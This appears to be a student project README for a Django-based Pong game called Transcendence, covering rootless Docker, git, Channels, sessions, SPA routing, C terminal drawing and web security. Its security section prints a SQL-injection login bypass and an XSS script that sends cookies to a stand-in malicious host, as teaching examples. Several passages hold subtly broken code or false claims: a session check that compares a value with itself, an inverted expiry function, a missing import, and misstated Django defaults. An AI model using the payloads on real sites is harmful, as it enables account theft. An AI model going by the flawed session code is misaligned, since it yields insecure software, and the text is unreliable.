# Transcendence

## The game

[The Mechanics of Pong](https://dooglz.github.io/set09121/pong2)

## Docker rootless (machine 42)

### Install (installed in machine 42)

[Install](https://docs.docker.com/engine/security/rootless/)

You must install newuidmap and newgidmap on the host. These commands are provided by the uidmap package on most distros.

/etc/subuid and /etc/subgid should contain at least 65,536 subordinate UIDs/GIDs for the user. In the following example, the user testuser has 65,536 subordinate UIDs/GIDs (231072-296607).

```console
id -u
1001
whoami
testuser
grep ^$(whoami): /etc/subuid
testuser:231072:65536
grep ^$(whoami): /etc/subgid
testuser:231072:65536
```

```console
bash /usr/bin/dockerd-rootless-setuptool.sh install
```

### Execute

```console
systemctl --user start docker
systemctl --user status docker
export PATH=/home/$USER/bin:$PATH
export DOCKER_HOST=unix:///run/user/$id/docker.sock
```
With $id is the uid get by command `id`

For next reboot, put the 2 export commands in '.zshrc'

The game is now on port 8080:

```console
https://127.0.0.1:8080
```

## Prerequisites

### Install `Django` `channels`

```console
pip install Django
pip install channels daphne
```

[Channels](https://channels.readthedocs.io/en/latest/index.html)

## Start game

```console
python3 manage.py runserver 0.0.0.0:8000
```

## github workflow

[GitHub flow](https://docs.github.com/en/get-started/quickstart/github-flow)
[Basic Branching and Merging](https://git-scm.com/book/en/v2/Git-Branching-Basic-Branching-and-Merging)

```console
make gits M="your message"
```

### New branch

```console
git checkout -b branch_name
git push --set-upstream origin branch_name
```

### Check a branch

```console
git checkout -b branch_name
git pull
```
... checking process ...

```console
git reset --hard
```

### Merge a branch

Merging a branch in GitHub involves combining changes from one branch into another, typically merging a feature branch into the main branch (such as `master` or `main`). Here are the general steps to merge a branch using GitHub:

1. **Ensure your local branch is up-to-date:**
   Before merging, make sure your local branch is up-to-date with the latest changes from the target branch (usually `main` or `master`).

   ```bash
   git checkout main
   git pull origin main
   git checkout your-feature-branch
   git merge main
   ```

2. **Resolve any conflicts (if necessary):**
   If there are conflicting changes between your feature branch and the target branch, you'll need to resolve them. Git will mark the conflicting files, and you need to manually resolve the conflicts.

   ```bash
   # After resolving conflicts
   git add <conflicted-file1> <conflicted-file2> ...
   git merge --continue
   ```

3. **Push the changes to your remote repository:**
   Once the local merge is complete, push the changes to your remote repository on GitHub.

   ```bash
   git push origin your-feature-branch
   ```

4. **Create a pull request (PR) on GitHub:**
   If you are merging into the main branch, you typically create a pull request. On GitHub, navigate to your repository, switch to your feature branch, and click on the "New pull request" button. Select the base branch (the branch you want to merge into, e.g., `main`) and compare branch (your feature branch). Provide a title and description for the pull request.

5. **Review and merge the pull request:**
   After creating the pull request, it goes through a review process. Once the changes are approved, you can merge the pull request. GitHub provides a "Merge pull request" button.

6. **Delete the feature branch (optional):**
   After merging, you may choose to delete the feature branch, especially if it was created for a specific task or feature.

   ```bash
   # Locally delete the branch
   git branch -d your-feature-branch

   # Remotely delete the branch
   git push origin --delete your-feature-branch
   ```

That's it! Your branch is merged, and changes are reflected in the target branch. Keep in mind that these are general steps, and the exact process may vary based on your specific repository and branching strategy.

## Bootstrap toolkit

[Introduction](https://getbootstrap.com/docs/4.6/getting-started/introduction/)

## Another games

2 players shoots each others for 3 minutes.

Bullets speed increase over times.

1 shot each second.

## Django

### Api
```
Transcendence
├── backend
│   ├── __init__.py
│   ├── settings.py
│   ├── urls.py
│   ├── asgi.py
│   └── wsgi.py
├── pong
│   ├── __init__.py
│   ├── settings.py
│   ├── apps.py
│   └── views.py
└── manage.py
```

[Api urls in subfolder](https://stackoverflow.com/questions/10313475/moving-django-apps-into-subfolder-and-url-py-error)

### Static files
If your JavaScript file is in a location that is not served by Django's development server, you need to make sure it's configured as a static file. In your Django project, you should have a folder named `static` where you store your static files (CSS, JavaScript, images, etc.). Ensure that your JavaScript file is placed in the appropriate static folder.

Update your `settings.py` to include your static files:

```
# settings.py
import os

# ...

STATIC_URL = '/static/'
STATICFILES_DIRS = [os.path.join(BASE_DIR, 'static')]

# ...
```

Add or update the `STATIC_ROOT` setting to point to a directory where you want to collect all your static files. For example:

```
# settings.py

# Your existing settings...

# Add or update this line
STATIC_ROOT = BASE_DIR / 'staticfiles'
```
Replace `'staticfiles'` with the desired directory path. `BASE_DIR` is a variable that represents the root directory of your Django project.

`STATICFILES_DIRS`: Specifies additional directories where Django should look for static files. These directories are searched when you use the `{% load static %}` template tag or the `static()` function in your templates. It is a list of strings representing paths.

```
# settings.py

STATICFILES_DIRS = [
    BASE_DIR / "myapp/static",
    "/var/www/static/",
]
```
`STATIC_ROOT`: Specifies the directory where Django will collect static files from all installed apps using the `collectstatic` management command. This is typically used in production to serve static files efficiently using a dedicated web server (e.g., Nginx or Apache).

```
# settings.py

STATIC_ROOT = BASE_DIR / 'staticfiles'
```

Make sure to run `python manage.py collectstatic` to collect static files into the `STATIC_ROOT` directory.

In your HTML file, you can then reference the JavaScript file using the `{% static %}` template tag:

```
<script src="{% static 'yourscript.js' %}"></script>
```

When Django runs in development mode (using `python manage.py runserver`), it can serve static files for you. `STATIC_URL` is the base URL under which these static files are accessible. For example, if `STATIC_URL` is set to `'/static/'`, a file named `style.css` in your `static` directory would be accessible at `http://localhost:8000/static/style.css`.


* Load the static template tag:

At the top of your template file (before using `{% static %}`), make sure you include the `{% load static %}` template tag.

```html
{% load static %}
<!DOCTYPE html>
<html>
...
```

### Cross-Site Request Forgery (CSRF) protection

By default, Django requires a valid CSRF token for any `POST` requests to be processed. This is a security feature to protect against CSRF attacks.

* Include CSRF Token in Your POST Request:
Make sure that your POST request includes the CSRF token. In a Django template, you can use the `{% csrf_token %}` template tag to include the CSRF token in your form.


```html
<form method="post" action="{% url 'my_post_endpoint' %}">
    {% csrf_token %}
    <!-- Your form fields go here -->
    <input type="submit" value="Submit">
</form>
```
If you are not using Django forms, you can include the CSRF token manually in your AJAX request or form data.

* Use the `@csrf_exempt` Decorator (Not Recommended for Production):
As mentioned earlier, you can use the `@csrf_exempt` decorator on your view to disable CSRF protection. However, this should be used with caution, especially in a production environment, as it opens your application to CSRF attacks.

python
```
from django.views.decorators.csrf import csrf_exempt

@csrf_exempt
def my_post_view(request):
    # Your view logic
```
If you choose this approach, make sure that your application has other security measures in place to protect against CSRF attacks.

* Check if Middleware Order is Correct:
Ensure that the 'django.middleware.csrf.CsrfViewMiddleware' middleware is included in your MIDDLEWARE setting and its order is correct. It should typically come before other middleware classes.

```python
MIDDLEWARE = [
    # ...
    'django.middleware.csrf.CsrfViewMiddleware',
    # ...
]
```

* AJAX Requests Include CSRF Token:
If you are making AJAX requests, make sure to include the CSRF token in the request headers. You can retrieve the token from a cookie named `csrftoken` and include it in the `X-CSRFToken` header.

```javascript
var csrftoken = getCookie('csrftoken');

// Include the token in your AJAX request
$.ajax({
    type: 'POST',
    url: '/my-post-endpoint/',
    data: {/* Your data here */},
    headers: {'X-CSRFToken': csrftoken},
    success: function(response) {
        // Handle success
    },
    error: function(error) {
        // Handle error
    }
});
```

### ASGI

ASGI stands for Asynchronous Server Gateway Interface. It's a specification for asynchronous web servers and frameworks in Python. ASGI enables handling multiple connections asynchronously, making it suitable for applications that require real-time features, such as chat applications, live notifications, or multiplayer games.


#### Configuration

The routing configuration in the `asgi.py` file defines how WebSocket connections are routed to consumers. Here's an example routing configuration:

```python
# asgi.py

import os
from django.core.asgi import get_asgi_application
from channels.routing import ProtocolTypeRouter, URLRouter
from channels.auth import AuthMiddlewareStack
from pong.consumers import PongConsumer

os.environ.setdefault('DJANGO_SETTINGS_MODULE', 'pong_project.settings')

application = ProtocolTypeRouter({
    "http": get_asgi_application(),
    "websocket": AuthMiddlewareStack(
        URLRouter(
            [
                # Add your WebSocket consumers here
                # For example:
                # re_path(r"ws/some_path/$", SomeConsumer.as_asgi()),
                re_path(r"ws/pong/$", PongConsumer.as_asgi()),
            ]
        )
    ),
})
```

* The `ProtocolTypeRouter` is used to define different protocols, such as HTTP and WebSocket.
* The `URLRouter` is responsible for routing WebSocket connections based on URL patterns.
* The `re_path` function is used to define a regular expression pattern for WebSocket paths.
* The `PongConsumer` is the consumer class that will handle WebSocket connections for the "ws/pong/" path.

You can add more consumers and paths as needed for your application. Each consumer handles the WebSocket connection, and you can define custom logic for handling messages, connecting, disconnecting, etc., within the respective consumer class (`PongConsumer` in this example).

#### consumers.py

# consumers.py

```python
import json
from channels.generic.websocket import AsyncWebsocketConsumer

class PongConsumer(AsyncWebsocketConsumer):
    async def connect(self):
        self.room_name = self.scope['url_route']['kwargs']['room_name']
        self.room_group_name = f"pong_{self.room_name}"

        # Join room group
        await self.channel_layer.group_add(
            self.room_group_name,
            self.channel_name
        )

        await self.accept()

    async def disconnect(self, close_code):
        # Leave room group
        await self.channel_layer.group_discard(
            self.room_group_name,
            self.channel_name
        )

    async def receive(self, text_data):
        # Handle user input (if needed)
        pass

    async def update_state(self, event):
        state = event['state']

        # Send the updated game state back to all clients in the room
        await self.send(text_data=json.dumps({
            'state': state,
        }))

    async def player_join(self, event):
        # Notify all clients when a new player joins the room
        player_count = event['player_count']
        await self.send(text_data=json.dumps({
            'player_count': player_count,
        }))
```

These methods are invoked when the corresponding event types are specified in the `group_send` method. The `type` field in the message dictionary determines which method should be called on the consumer.

```python
# Server-side code triggering events

# Update game state
await self.channel_layer.group_send(
    self.room_group_name,
    {
        'type': 'update_state',
        'state': updated_state_data,
    }
)

# Notify player join
await self.channel_layer.group_send(
    self.room_group_name,
    {
        'type': 'player_join',
        'player_count': updated_player_count,
    }
)
```

### Sessions

Maintaining client sessions with Django models involves using a combination of models, views, and middleware. Here's a step-by-step guide:

1. **Create a Session Model:** Define a model to represent user sessions. This model should have fields for the session ID, user ID, and an expiration timestamp.

```python
from django.db import models

class Session(models.Model):
    session_id = models.CharField(max_length=40, primary_key=True)
    user = models.ForeignKey('users.User', on_delete=models.CASCADE)
    expires = models.DateTimeField()
```

2. **Create a Session View:** Define a view that generates and stores session tokens for new users. This view should receive the user's identity and generate a cryptographically signed token. Then, it should create a new session object in the database and store the token and user ID.

```python
from django.shortcuts import render, redirect
from django.contrib.auth import login
from .models import Session

def create_session(request):
    # Generate a cryptographically signed session token
    token = generate_session_token()

    # Create a new Session object and store the token and user ID
    session = Session(session_id=token, user=request.user)
    session.save()

    # Set the session token in the response cookies
    response = redirect('home')
    response.set_cookie('session_id', token)

    return response
```

3. **Use SessionMiddleware:** Configure Django's session middleware to automatically load session data from the cookie and associate it with the current request context. This middleware will read the session ID from the 'session_id' cookie and look up the corresponding session object in the database. If the session is valid, it will be associated with the request context.

In your project's settings.py file, add the following middleware configuration:

```python
MIDDLEWARE = [
    'django.middleware.security.SecurityMiddleware',
    'django.contrib.sessions.middleware.SessionMiddleware',
    ...
]
```

4. **Verify Session Tokens:** In your views that require a valid session, verify the session token from the request context. This can be done by retrieving the session object from the database using the session ID and checking if the token matches the session's `session_id` field.

```python
def protected_view(request):
    # Retrieve the session object from the request context
    session = request.session

    # Verify the session token
    if session.get('session_id') != Session.objects.get(session_id=session.get('session_id')).session_id:
        # Session verification failed, redirect to login
        return redirect('login')

    # Access user data or perform protected actions
    user = session.get('user')
    ...
```

By following these steps, you can effectively maintain client sessions in Django applications using session tokens and Django models. This approach offers enhanced security, scalability, and portability compared to traditional session cookie methods.

#### Session Expires

There are two main ways to check if a session has expired in Django:

**1. Using the `get_expiry_age()` method**

The `get_expiry_age()` method returns the number of seconds until the current session will expire. If the session has already expired, the method will return `0`.

```python
from django.contrib.sessions.backends.base import SessionBase

def is_session_expired(session: SessionBase) -> bool:
    if session.get_expiry_age() <= 0:
        return True
    else:
        return False
```

**2. Using the `set_expiry()` method**

The `set_expiry()` method sets the expiration time for the current session. By default, sessions will expire after 31536000 seconds (one year).

```python
from django.contrib.sessions.backends.base import SessionBase

def check_session_expiry(session: SessionBase) -> bool:
    seconds_left = session.get_expiry_age()
    if seconds_left < 30:
        return False
    else:
        return True
```

Here's an example of how to use these methods to check if a session has expired:

```python
from django.shortcuts import render
from django.contrib.sessions.backends.base import SessionBase

def my_view(request):
    session = request.session

    if is_session_expired(session):
        # Session has expired, redirect to login
        return redirect('login')

    if check_session_expiry(session):
        # Session is about to expire, set a new expiry time
        session.set_expiry(31536000)

```

By checking the session expiration status, you can ensure that your application is not serving expired sessions to users. This helps to maintain the security and integrity of your application's data and interactions with users.

#### SessionMiddleware

Using SessionMiddleware is more secure and efficient than sending session data directly in POST requests. Here are the key reasons why:

**Security:** SessionMiddleware handles the storage and retrieval of session data in an encrypted and secure manner. This protects sensitive user information from being tampered with or stolen. When you send session data directly in POST requests, it is transmitted in plain text, making it vulnerable to interception and misuse.

**Scalability:** SessionMiddleware handles session management centrally, reducing the load on individual views. This is particularly important for applications with a high volume of requests, as it improves server performance and scalability. When you send session data directly in POST requests, each view needs to handle the session management, which can lead to performance bottlenecks.

**Portability:** SessionMiddleware uses a standardized format for storing session data, making it easy to integrate with different web frameworks and technologies. When you send session data directly in POST requests, you are tied to the specific format used by your application, which can limit portability.

**Ease of Use:** SessionMiddleware simplifies session management by abstracting away the underlying details. This makes it easier to develop and maintain applications that rely on sessions. When you send session data directly in POST requests, you need to handle all of the session management logic yourself, which can be more complex and error-prone.

In summary, while sending session data directly in POST requests may seem simpler, using SessionMiddleware offers a more secure, efficient, and portable solution for managing user sessions in Django applications. It abstracts away the complexities of session management, reduces the risk of security vulnerabilities, and improves the overall performance of your application.


#### Django load javascript
To ensure that Django serves the JavaScript file with the correct content type when using the `<script>` tag in your template, you can use the `HttpResponse` class and set the `Content-Type` header accordingly.

Here's an example of how you can do this in a Django view:

```python
from django.http import HttpResponse

def your_view(request):
    # Your view logic here

    # Assuming 'main.js' is in the 'static' directory
    js_file_path = 'static/main.js'

    with open(js_file_path, 'r') as file:
        js_content = file.read()

    response = HttpResponse(js_content, content_type='application/javascript')
    return response
```

In this example, we use the `HttpResponse` class and set the `content_type` parameter to 'application/javascript'. This ensures that the response is interpreted as JavaScript by the browser.

However, a more Django-like way to achieve this is to use the `render` shortcut along with a template. Create a template file (e.g., `main.js`) that contains your JavaScript code:

```javascript
// main.js
console.log('Hello from main.js');
// Your JavaScript code goes here
```

Then, in your view, use the `render` shortcut:

```python
from django.shortcuts import render

def your_view(request):
    # Your view logic here

    return render(request, 'main.js', content_type='application/javascript')
```

This way, you separate your JavaScript code into a template file, and Django will take care of setting the correct content type for you. Make sure to adjust the paths and names according to your project structure.


### Django models

```bash
python3 manage.py makemigrations
python3 manage.py migrate
```

In Django models, the primary key is often represented by an integer field called `id`. By default, Django assigns an auto-incrementing integer to the `id` field, making it a numeric primary key. However, you can customize the primary key field or use other fields like `CharField` or `UUIDField` to have primary keys as strings.

Here are a few examples:

### Using a CharField for String Primary Key:

```python
from django.db import models

class MyModel(models.Model):
    custom_id = models.CharField(primary_key=True, max_length=50)
    # other fields...
```

With this setup, the `custom_id` field will be the primary key, and it will be a string.

### Using UUIDField for UUID Primary Key:

```python
import uuid
from django.db import models

class MyModel(models.Model):
    uuid_id = models.UUIDField(primary_key=True, default=uuid.uuid4, editable=False)
    # other fields...
```

This example uses `UUIDField` for the primary key, resulting in a UUID (Universally Unique Identifier) as the primary key.

### Convert Numeric Primary Key to String Representation:

If you want to convert an existing numeric primary key to a string representation, you can override the `__str__` method in your model:

```python
from django.db import models

class MyModel(models.Model):
    # fields...

    def __str__(self):
        return str(self.id)
```

In this example, the `__str__` method converts the numeric primary key (`id`) to its string representation when the model instance is converted to a string.

Choose the approach that best fits your application's requirements and the nature of your primary keys. Keep in mind that changing the primary key type after data has been added to the database can be complex, and it's recommended to plan such changes carefully, especially in production environments.

### str()

When you call `str()` on a Django model instance, the `__str__` method is automatically invoked, and it returns the string representation of the model. This is useful, for example, when you want to display a model instance in a template or print it in the console.

Here's an example using the `MyModel` with a custom `__str__` method:

```python
from django.db import models

class MyModel(models.Model):
    name = models.CharField(max_length=255)

    def __str__(self):
        return str(self.id)  # Convert the numeric primary key to its string representation

# Example usage:
my_instance = MyModel.objects.get(id=1)
print(str(my_instance))  # This will call the __str__ method and print the string representation
```

In this example, when you print or convert `my_instance` to a string, it will call the `__str__` method, and the result will be the string representation of the model. In this case, the numeric primary key (`id`) is converted to its string representation.

Keep in mind that the `__str__` method is used for human-readable representations, and it's often handy when you need to display model instances in templates or logs. If you're working with JSON serialization or similar scenarios, you might want to consider using the `__repr__` method instead.


### Django admin

Django provides a built-in administrative interface called the Django Admin, which allows you to visualize and manage your models easily. To use the Django Admin, you need to follow these steps:

1. **Create a superuser:**
   - Run the following command to create a superuser account. This account will have administrative privileges to access the Django Admin interface.
   
     ```bash
     python manage.py createsuperuser
     ```

   - Follow the prompts to enter a username, email address, and password.

2. **Register your models in the admin.py file:**
   - In your Django app, locate or create the `admin.py` file.
   - Register your models in the `admin.py` file using the `admin.site.register()` function.

     ```python
     # Example admin.py file
     from django.contrib import admin
     from .models import YourModel1, YourModel2

     admin.site.register(YourModel1)
     admin.site.register(YourModel2)
     ```

3. **Run the development server:**
   - Start your Django development server by running:

     ```bash
     python manage.py runserver
     ```

4. **Access the Django Admin interface:**
   - Open your web browser and go to `http://127.0.0.1:8000/admin/` (replace `8000` with your actual development server port).
   - Log in with the superuser credentials you created earlier.

5. **Explore and manage your models:**
   - Once logged in, you'll see a list of registered models. Click on a model to see a list of instances and details.
   - You can perform various actions like adding, editing, and deleting model instances through the Django Admin interface.

By default, the Django Admin provides a basic and functional interface for managing your models. If you need more customization or want to build a custom frontend, you might consider using third-party packages like `django-admin-interface`, `django-jet`, or building your own views using Django views and templates.

Remember to secure your Django Admin by configuring the `ADMIN` settings in your project's `settings.py` file, restricting access only to authorized users.


#### Django admin not work

1. **Ensure `django.contrib.admin` is in `INSTALLED_APPS`:**
   In your `settings.py` file, make sure that `'django.contrib.admin'` is included in the `INSTALLED_APPS` list:

    ```python
    INSTALLED_APPS = [
        # ...
        'django.contrib.admin',
        # ...
    ]
    ```

2. **Check Template Loaders:**
   Ensure that your `TEMPLATES` setting in `settings.py` includes `'django.contrib.admin'` in the `'APP_DIRS'` option. The default Django project template usually includes this, but it's worth checking:

    ```python
    TEMPLATES = [
        {
            'BACKEND': 'django.template.backends.django.DjangoTemplates',
            'DIRS': [],
            'APP_DIRS': True,
            # ...
        },
    ]
    ```



### Other stuffs

[Disable logging](https://stackoverflow.com/questions/5255657/how-can-i-disable-logging-while-running-unit-tests-in-python-django)

## Javascript
In Firefox Developer Tools, you can force the browser to reload JavaScript and bypass the cache by following these steps:

1. **Open Developer Tools:**
   - Right-click on the page and select "Inspect" from the context menu.
   - Alternatively, you can press `Ctrl + Shift + I` (Windows/Linux) or `Cmd + Option + I` (Mac) to open Developer Tools.

2. **Go to the "Network" tab:**
   - In the Developer Tools panel, navigate to the "Network" tab.

3. **Enable "Disable Cache":**
   - At the top of the Network tab, there is a checkbox labeled "Disable Cache." Make sure this checkbox is checked. This ensures that the browser won't use cached resources, including JavaScript files.

4. **Reload the page:**
   - Press `Ctrl + R` (Windows/Linux) or `Cmd + R` (Mac) to reload the page.

By disabling the cache in the Network tab, you force the browser to fetch all resources, including JavaScript files, from the server instead of using the cached versions.

Alternatively, you can use a hard refresh to clear the cache. You can do this by pressing `Ctrl + Shift + R` (Windows/Linux) or `Cmd + Shift + R` (Mac) instead of a regular reload.

These steps should help you ensure that your JavaScript changes are loaded without relying on cached versions.

## Javascript (SPA)

[How to include a JavaScript file in another JavaScript file?](https://www.scaler.com/topics/javascript/import-js-file-in-js/)

### SPA (Single-page application)
#### URL history

Use the pushState method to add a new state to the browser's history stack without causing a navigation.

```javascript
// Change the URL without reloading the page
function changeURLWithoutReload(newPath) {
    window.history.pushState({}, '', newPath);
}

// Example usage
changeURLWithoutReload('/new-page');

// You might also want to handle the popstate event to handle back/forward navigation
window.onpopstate = function(event) {
    // Handle the back/forward button click here
    console.log('Back/Forward button clicked');
};
```

#### Router
In case client does not access main page at startup

```javascript
// Check the URL on page load
window.onload = function() {
    const currentPath = window.location.pathname;

    // Use a switch statement or if-else conditions to handle different routes
    switch (currentPath) {
        case '/page1':
            // Load content for Page 1
            break;
        case '/page2':
            // Load content for Page 2
            break;
        default:
            // Handle unknown routes or redirect to a default route
            window.location.href = '/default';
            break;
    }
};
```


## Drawing in terminal

### Drawing and update

Drawing in a terminal using C or C++ involves using terminal escape sequences to control cursor movement and text formatting. The specific escape sequences may vary slightly depending on the terminal emulator you're using, as different terminals may interpret them differently.

Here's a simple example in C that draws a basic shape (a rectangle) and updates it:

```c
#include <stdio.h>
#include <unistd.h>

void clearScreen() {
    printf("\033[2J");  // ANSI escape code to clear the screen
    printf("\033[H");   // Move the cursor to the top-left corner
    fflush(stdout);
}

void drawRectangle(int width, int height) {
    for (int i = 0; i < height; ++i) {
        for (int j = 0; j < width; ++j) {
            printf("* ");
        }
        printf("\n");
    }
    fflush(stdout);
}

int main() {
    int width = 10;
    int height = 5;

    while (1) {
        clearScreen();
        drawRectangle(width, height);
        usleep(500000);  // Sleep for 0.5 seconds (500,000 microseconds)
        // You can use nanosleep or sleep for longer intervals depending on your needs
    }

    return 0;
}
```

In this example:
- The `clearScreen` function uses ANSI escape codes (`\033[2J` and `\033[H`) to clear the screen and move the cursor to the top-left corner.
- The `drawRectangle` function prints a rectangle made of asterisks.
- The `main` function enters an infinite loop to continuously update the screen with the drawn rectangle.

You can modify the `width` and `height` variables, as well as the drawing logic in the `drawRectangle` function to customize the appearance of your drawing.

Compile the program using a C compiler (e.g., `gcc`) and run it in a terminal. Keep in mind that not all terminals fully support ANSI escape codes, so the result may vary depending on the terminal emulator you are using.

### Print unicode characters

[List of Unicode characters](https://en.wikipedia.org/wiki/List_of_Unicode_characters)

[Blocks Elements](https://en.wikipedia.org/wiki/Block_Elements)

```c
#include <wchar.h>

int main() {
    wprintf(L"Hello, this is a Unicode character: %lc\n", L'\u2603'); // Snowman character
    return 0;
}
```

In this example:
- The `wprintf` function is used instead of `printf`.
- The `%lc` format specifier is used for printing a wide character.

Make sure to use the `L` prefix before the string and character literals to denote wide strings and characters.

Note that the actual support for Unicode characters depends on the terminal emulator and the font being used. Some terminals and fonts may not display all Unicode characters correctly, so you might need to configure your terminal settings accordingly. Additionally, your source code file should be saved in a Unicode-compatible encoding (such as UTF-8) to handle Unicode literals properly.


Django, a popular Python web framework, includes built-in features and best practices to help protect your application against SQL injections and Cross-Site Scripting (XSS) attacks. Here are some recommendations:

### Protection Against SQL Injections:

1. **Use Django's ORM (Object-Relational Mapping):**
   Django's ORM helps in preventing SQL injection attacks by automatically escaping parameters in queries. Instead of using raw SQL queries, utilize the ORM for database interactions.

   ```python
   # Example of using Django ORM
   from myapp.models import MyModel

   data = MyModel.objects.filter(name=user_input)
   ```

2. **Parameterized Queries:**
   If you need to use raw SQL, use parameterized queries to ensure that user inputs are treated as parameters rather than being directly embedded in the SQL statement.

   ```python
   # Example of using parameterized queries
   cursor.execute("SELECT * FROM mytable WHERE column = %s", [user_input])
   ```

3. **Avoid Dynamic SQL Queries:**
   Avoid constructing dynamic SQL queries by concatenating strings. This practice can make your application vulnerable to injection attacks.

### Protection Against XSS:

1. **Template System Escaping:**
   Django's template system automatically escapes variables by default. This helps prevent the execution of malicious scripts in the browser.

   ```html
   <!-- Example of template system escaping -->
   <p>{{ user_input }}</p>
   ```

2. **Safe HTML Output:**
   If you need to output HTML that you know is safe, use the `|safe` filter. However, use this cautiously and only when you are sure that the content is safe.

   ```html
   <!-- Example of using the |safe filter -->
   <p>{{ user_input|safe }}</p>
   ```

3. **Use the `mark_safe` Function:**
   If you need to mark a string as safe in Python code, use the `mark_safe` function.

   ```python
   from django.utils.safestring import mark_safe

   safe_html = mark_safe("<p>This is safe HTML</p>")
   ```

4. **Content Security Policy (CSP):**
   Implement Content Security Policy headers in your web application to control the sources from which certain types of content can be loaded.

   ```python
   # Example of setting Content Security Policy in Django settings
   SECURE_CONTENT_TYPE_NOSNIFF = True
   SECURE_BROWSER_XSS_FILTER = True
   ```

By following these best practices and leveraging Django's built-in security features, you can significantly reduce the risk of SQL injections and XSS attacks in your web applications. Regularly update Django and its dependencies to ensure that you benefit from the latest security patches.

### Example of SQL injection:

A SQL injection occurs when an attacker is able to manipulate a SQL query by injecting malicious SQL code into input fields or parameters. Here's a simplified example to illustrate the concept:

Consider a simple login system with the following SQL query to check user credentials:

```sql
SELECT * FROM users WHERE username = 'input_username' AND password = 'input_password';
```

In this query, `input_username` and `input_password` are placeholders for user input. Now, imagine a user tries to log in with the following input:

**Username:** `admin' OR '1'='1' --`

When this input is substituted into the SQL query, it becomes:

```sql
SELECT * FROM users WHERE username = 'admin' OR '1'='1' --' AND password = 'input_password';
```

The `--` in SQL is used for comments, so everything after `--` is ignored. In this case, the injected code causes the query to return all rows from the `users` table because the condition `'1'='1'` is always true.

This allows an attacker to bypass the login mechanism and gain unauthorized access. In a real-world scenario, an attacker might extract sensitive information, delete records, or perform other malicious actions.

To prevent SQL injections, it's crucial to use parameterized queries or an Object-Relational Mapping (ORM) framework like Django's, as they automatically handle input sanitization and avoid direct string concatenation for constructing SQL queries.

### Example of XSS:

Cross-Site Scripting (XSS) attacks involve injecting malicious scripts into web pages that are then viewed by other users. These scripts can be used to steal information, manipulate the content of a web page, or perform other malicious activities on behalf of the user unknowingly. Here's a simplified example to illustrate an XSS attack:

Suppose you have a web application that displays user comments. The comments are displayed on the page without proper input validation and escaping.

**Vulnerable HTML Code:**

```html
<!DOCTYPE html>
<html>
<head>
    <title>Comment Page</title>
</head>
<body>
    <div>
        <h1>User Comments</h1>
        <ul>
            <!-- User comments are displayed without proper validation -->
            {% for comment in comments %}
                <li>{{ comment.text }}</li>
            {% endfor %}
        </ul>
    </div>
</body>
</html>
```

In this example, the `{{ comment.text }}` variable is directly inserted into the HTML without proper escaping.

Now, consider a user who posts a comment with the following content:

```html
<script>
    // Malicious script to steal user cookies
    const maliciousScript = new Image();
    maliciousScript.src = 'https://malicious-site.com/steal?cookie=' + document.cookie;
    document.body.appendChild(maliciousScript);
</script>
```

When this comment is displayed on the web page, the script will be executed in the context of other users viewing the page. The script, in this case, tries to steal the user's cookies and send them to a malicious site.

To prevent XSS attacks, you should always sanitize and escape user-generated content before rendering it in HTML. In Django, for example, you can use the `|safe` filter cautiously for content that you know is safe, but it's generally better to rely on automatic escaping provided by the template system. Additionally, implementing Content Security Policy (CSP) headers can further mitigate the impact of XSS attacks by restricting the sources from which scripts can be executed.